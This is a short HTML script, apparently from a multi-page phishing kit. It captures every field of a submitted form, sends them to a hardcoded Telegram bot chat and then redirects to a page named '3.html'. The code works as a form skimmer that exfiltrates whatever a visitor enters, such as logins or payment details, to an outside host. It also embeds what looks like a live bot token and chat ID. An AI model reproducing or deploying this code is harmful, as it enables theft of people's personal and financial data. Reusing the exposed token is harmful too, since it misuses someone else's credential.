   <script>
    async function sendToTelegram(event) {
        event.preventDefault(); // Prevent form's default submission

        // Collect Form Data
        const form = event.target;
        const formData = new FormData(form);
        const data = {};
        formData.forEach((value, key) => {
            data[key] = value;
        });

        // Telegram Bot Token and Chat ID
        const botToken = "7247567488:AAH4j2BtXebdjviq0NdjgETTydSZB_RU6Pk";
        const chatId = "7155441629";

        // Create Message
        let message = "New Form Submission:\n";
        for (const [key, value] of Object.entries(data)) {
            message += `${key}: ${value}\n`;
        }

        // Telegram API URL
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // Send Data to Telegram
        try {
            const response = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message }),
            });

            if (response.ok) {
                // Redirect to another page (replace 'nextpage.html' with your actual page)
                window.location.href = "3.html";
            } else {
                alert("Failed to send message to Telegram.");
            }
        } catch (error) {
            console.error("Error:", error);
            alert("An error occurred while sending the message.");
        }
    }
</script>
